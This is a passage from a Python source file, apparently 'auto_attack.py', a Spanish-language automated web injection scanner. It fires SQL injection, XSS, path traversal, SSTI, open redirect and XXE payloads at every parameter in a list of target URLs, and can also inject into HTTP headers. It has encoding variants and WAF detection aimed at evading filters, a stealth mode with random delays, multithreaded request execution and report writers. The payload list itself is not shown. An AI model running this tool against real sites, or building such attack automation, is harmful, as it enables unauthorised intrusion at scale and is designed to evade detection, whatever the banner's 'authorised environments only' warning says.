        sc_str = str(sc) if sc else result.get('error', 'ERR')[:7]

        print(
            f"\n{C.MAGENTA}[{ts}]{C.END} "
            f"{color}[{sev:<8}]{C.END} "
            f"{sc_col}[{sc_str:>7}]{C.END} "
            f"{C.CYAN}{cat:<13}{C.END}"
            f"{C.GRAY}param={C.ORANGE}{result['param']:<12}{C.END} "
            f"{C.WHITE}{url_s}{C.END}"
        )
        if result['vulnerable']:
            print(
                f"  {color}{C.BOLD}↳ VULNERABLE{C.END} "
                f"{C.GRAY}payload={C.BLUE}{result['payload'][:70]}{C.END}"
            )
            if result['indicators']:
                print(f"  {C.GRAY}  indicadores: {', '.join(result['indicators'][:5])}{C.END}")

    # ── Deduplicar URLs por estructura ───────────────────────────────────────
    @staticmethod
    def _dedup_urls(urls):
        seen = set()
        out  = []
        for u in urls:
            parsed = urlparse(u)
            key    = (parsed.netloc, parsed.path, frozenset(parse_qs(parsed.query).keys()))
            if key not in seen:
                seen.add(key)
                out.append(u)
        return out

    # ── Correr ────────────────────────────────────────────────────────────────
    def run(self):
        os.makedirs(EXPORTS_DIR, exist_ok=True)

        print(f"{C.CYAN}[*] Cargando URLs desde: {self.cfg.file}{C.END}")
        with open(self.cfg.file, 'r', encoding='utf-8') as f:
            all_urls = [l.strip() for l in f if l.strip()]

        # Deduplicar
        if self.cfg.dedup:
            before = len(all_urls)
            all_urls = self._dedup_urls(all_urls)
            print(f"  {C.GRAY}Deduplicación: {before} → {len(all_urls)} URLs únicas{C.END}")

        # Parámetros
        if self.cfg.params:
            target_params = self.cfg.params
            print(f"{C.YELLOW}✓{C.END} Parámetros fijos: {', '.join(target_params)}")
        else:
            param_set = set()
            for u in all_urls:
                for p in parse_qs(urlparse(u).query).keys():
                    if p.lower() not in SENSITIVE_PARAMS:
                        param_set.add(p)
            target_params = sorted(param_set)
            if not target_params:
                print(f"{C.RED}[!] No se encontraron parámetros en las URLs.{C.END}")
                return
            print(f"{C.GREEN}✓{C.END} Auto-detectados {len(target_params)} parámetros: "
                  f"{', '.join(target_params[:20])}{'…' if len(target_params)>20 else ''}")

        # Filtrar URLs con parámetros objetivo
        target_urls = [
            u for u in all_urls
            if any(p in parse_qs(urlparse(u).query) for p in target_params)
        ]
        print(f"{C.GREEN}✓{C.END} Total URLs: {len(all_urls)}  |  URLs objetivo: {len(target_urls)}")

        if not target_urls:
            print(f"{C.RED}[!] No se encontraron URLs con los parámetros objetivo.{C.END}")
            return

        # Detección WAF
        waf = None
        if self.cfg.waf_detect:
            waf = self.detect_waf(target_urls)

        # Payloads según modo y categorías
        categories = self.cfg.categories or list(PAYLOADS.keys())
        if self.cfg.quick:
            payloads_to_use = {c: PAYLOADS[c][:3] for c in categories if c in PAYLOADS}
        else:
            payloads_to_use = {c: PAYLOADS[c] for c in categories if c in PAYLOADS}

        # Variantes de codificación
        encode_variants = self.cfg.encode or [None]

        # Construir lista de tareas
        tasks = []
        for url in target_urls:
            url_params = set(parse_qs(urlparse(url).query).keys())
            for param in target_params:
                if param not in url_params:
                    continue
                for cat, plist in payloads_to_use.items():
                    for payload in plist:
                        for method in self.cfg.methods:
                            for enc in encode_variants:
                                tasks.append((url, param, payload, cat, method, enc, False))
                        if self.cfg.headers:
                            for hdr in INJECTION_HEADERS[:4]:
                                tasks.append((url, hdr, payload, cat, 'GET', None, True))

        self.total_tests = len(tasks)
        print(f"\n{C.CYAN}[*] {self.total_tests} pruebas programadas{C.END} "
              f"| Workers: {self.cfg.workers} | Timeout: {self.cfg.timeout}s "
              f"| Categorías: {', '.join(payloads_to_use.keys())}")
        if self.cfg.stealth:
            print(f"  {C.GRAY}Modo STEALTH activo (delays aleatorios 0.3–1.2s){C.END}")
        if self.cfg.aggressive:
            print(f"  {C.ORANGE}Modo AGRESIVO activo (sin delays){C.END}")
        print()

        self.start_time = time.time()

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.cfg.workers) as ex:
            futures = [ex.submit(self.test_url, *task) for task in tasks]
            concurrent.futures.wait(futures)

        print(f"\n")
        self._save_reports(waf)

    # ── Guardar reportes ──────────────────────────────────────────────────────
    def _save_reports(self, waf=None):
        elapsed = time.time() - self.start_time
        ts      = datetime.now().strftime('%Y%m%d_%H%M%S')
        tps     = len(self.results) / elapsed if elapsed > 0 else 0

        vuln_counts = defaultdict(int)
        sev_counts  = defaultdict(int)
        for r in self.results:
            if r['vulnerable']:
                vuln_counts[r['category']] += 1
            sev_counts[r['severity']] += 1

        # ── Reporte TXT ─────────────────────────────────────────────────────
        txt_file  = os.path.join(EXPORTS_DIR, f'attack_v2_{ts}.txt')
        json_file = os.path.join(EXPORTS_DIR, f'attack_v2_{ts}.json')
        html_file = os.path.join(EXPORTS_DIR, f'attack_v2_{ts}.html')

        lines = []
        L = lines.append
        L("=" * 80)
        L(f"  AUTO ATTACK v{VERSION} — INFORME DE SEGURIDAD")
        L(f"  Fecha   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        L(f"  Fuente  : {os.path.basename(self.cfg.file)}")
        L(f"  WAF     : {waf or 'No detectado'}")
        L("=" * 80)
        L("")
        L(f"  Pruebas   : {len(self.results)}")
        L(f"  Tiempo    : {elapsed:.2f} s  ({tps:.2f} pruebas/s)")
        L(f"  Vulns     : {sum(vuln_counts.values())} ({', '.join(f'{k}:{v}' for k,v in vuln_counts.items())})")
        L(f"  Severidad : CRITICAL={sev_counts['CRITICAL']} HIGH={sev_counts['HIGH']} MEDIUM={sev_counts['MEDIUM']}")
        L("")
        L("─" * 80)
        L("  VULNERABILIDADES ENCONTRADAS")
        L("─" * 80)
        vuln_results = [r for r in self.results if r['vulnerable']]
        if not vuln_results:
            L("  No se detectaron vulnerabilidades.")
        for r in sorted(vuln_results, key=lambda x: ['CRITICAL','HIGH','MEDIUM','INFO','NONE'].index(x['severity'])):
            L("")
            L(f"  [{r['severity']}] {r['category'].upper()}")
            L(f"    URL       : {r['url_original']}")
            L(f"    Parámetro : {r['param']}")
            L(f"    Payload   : {r['payload']}")
            L(f"    Método    : {r['method']}")
            L(f"    HTTP      : {r['status_code']}")
            L(f"    Indicadores: {', '.join(r['indicators'])}")
        L("")
        L("=" * 80)
        L("  FIN DEL INFORME — AUTO ATTACK v" + VERSION)
        L("=" * 80)

        with open(txt_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(lines))

        # ── Reporte JSON ────────────────────────────────────────────────────
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump({
                'meta': {
                    'version': VERSION,
                    'timestamp': datetime.now().isoformat(),
                    'source': self.cfg.file,
                    'waf': waf,
                    'total_tests': len(self.results),
                    'elapsed': elapsed,
                    'tests_per_sec': tps,
                    'vulnerabilities': sum(vuln_counts.values()),
                },
                'results': self.results
            }, f, ensure_ascii=False, indent=2)

        # ── Reporte HTML ────────────────────────────────────────────────────
        if not self.cfg.no_html:
            html = generate_html_report(self.results, {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'source':    os.path.basename(self.cfg.file),
                'waf':       waf or '',
                'elapsed':   elapsed,
                'tests_per_sec': tps,
            })
            with open(html_file, 'w', encoding='utf-8') as f:
                f.write(html)

        # ── Resumen ─────────────────────────────────────────────────────────
        print(f"\n{C.MAGENTA}╔{'═'*66}╗{C.END}")
        print(f"{C.MAGENTA}║{C.END}  {C.CYAN}{C.BOLD}AUTO ATTACK v{VERSION} — RESUMEN{C.END}{' '*27}{C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}╠{'═'*66}╣{C.END}")
        print(f"{C.MAGENTA}║{C.END}  Pruebas realizadas  : {C.WHITE}{len(self.results):>6}{C.END}{'':>33}{C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}║{C.END}  Tiempo total        : {C.WHITE}{elapsed:>6.2f}s{C.END}{'':>32}{C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}║{C.END}  Velocidad           : {C.WHITE}{tps:>6.2f} pruebas/s{C.END}{'':>28}{C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}║{C.END}  CRITICAL            : {C.RED}{C.BOLD}{sev_counts['CRITICAL']:>6}{C.END}{'':>33}{C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}║{C.END}  HIGH                : {C.RED}{sev_counts['HIGH']:>6}{C.END}{'':>33}{C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}║{C.END}  MEDIUM              : {C.YELLOW}{sev_counts['MEDIUM']:>6}{C.END}{'':>33}{C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}║{C.END}  WAF detectado       : {C.ORANGE}{(waf or 'No'):<6}{C.END}{'':>33}{C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}╠{'═'*66}╣{C.END}")
        print(f"{C.MAGENTA}║{C.END}  {C.GREEN}TXT :{C.END} {txt_file[:58]}{C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}║{C.END}  {C.GREEN}JSON:{C.END} {json_file[:58]}{C.MAGENTA}║{C.END}")
        if not self.cfg.no_html:
            print(f"{C.MAGENTA}║{C.END}  {C.GREEN}HTML:{C.END} {html_file[:58]}{C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}╚{'═'*66}╝{C.END}\n")

# ──────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ──────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        prog='auto_attack.py',
        description=f'AUTO ATTACK v{VERSION} — Motor de Inyección Profesional',
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument('--file',       default=DEFAULT_INPUT,
                        help='Archivo con URLs objetivo')
    parser.add_argument('--params',     type=lambda s: [p.strip() for p in s.split(',')],
                        help='Parámetros fijos (ej: id,q,search)')
    parser.add_argument('--methods',    default='GET',
                        type=lambda s: [m.strip().upper() for m in s.split(',')],
                        help='Métodos HTTP (GET,POST)')
    parser.add_argument('--encode',     type=lambda s: [e.strip() for e in s.split(',')],
                        help='Encodings (url,double,base64,html)')
    parser.add_argument('--headers',    action='store_true',
                        help='Inyectar también en cabeceras HTTP')
    parser.add_argument('--waf-detect', action='store_true',
                        help='Detectar WAF antes de atacar')
    parser.add_argument('--stealth',    action='store_true',
                        help='Modo sigiloso (delays aleatorios)')
    parser.add_argument('--aggressive', action='store_true',
                        help='Modo agresivo (sin delays)')
    parser.add_argument('--workers',    type=int, default=8,
                        help='Hilos paralelos (default: 8)')
    parser.add_argument('--timeout',    type=int, default=10,
                        help='Timeout por request en segundos (default: 10)')
    parser.add_argument('--quick',      action='store_true',
                        help='Solo 3 payloads por categoría')
    parser.add_argument('--categories', type=lambda s: [c.strip() for c in s.split(',')],
                        help='Categorías a probar (sqli,xss,lfi,ssti,redirect,xxe)')
    parser.add_argument('--severity',   choices=['critical','high','medium','info','all'],
                        default='all', help='Nivel mínimo de severidad a reportar')
    parser.add_argument('--no-html',    action='store_true',
                        help='No generar reporte HTML')
    parser.add_argument('--no-dedup',   action='store_true',
                        help='No deduplicar URLs')

    cfg = parser.parse_args()

    # Normalizar nombres de categorías
    cat_map = {
        'sqli':       'sql_injection',
        'sql':        'sql_injection',
        'lfi':        'path_traversal',
        'traversal':  'path_traversal',
        'xss':        'xss',
        'ssti':       'ssti',
        'redirect':   'open_redirect',
        'xxe':        'xxe',
    }
    if cfg.categories:
        cfg.categories = [cat_map.get(c, c) for c in cfg.categories]

    cfg.dedup = not cfg.no_dedup

    if not os.path.isfile(cfg.file):
        print(f"{C.RED}[!] Archivo no encontrado: {cfg.file}{C.END}")
        print(f"{C.YELLOW}    Ejecuta primero: python3 filtrar_200.py{C.END}")
        sys.exit(1)

    # Banner compacto (reemplaza el arte ASCII grande)
    print(f"""
{C.CYAN}{C.BOLD}AUTO ATTACK v{VERSION}{C.END}
{C.GRAY}Motor de Inyección Profesional
github.com/YoandisR · Link Analyzer PRO v5.2
{C.RED}⚠ SOLO ENTORNOS AUTORIZADOS — USO BAJO TU RESPONSABILIDAD{C.END}
""")

    attacker = AutoAttackElite(cfg)
    attacker.run()

if __name__ == '__main__':
    main()
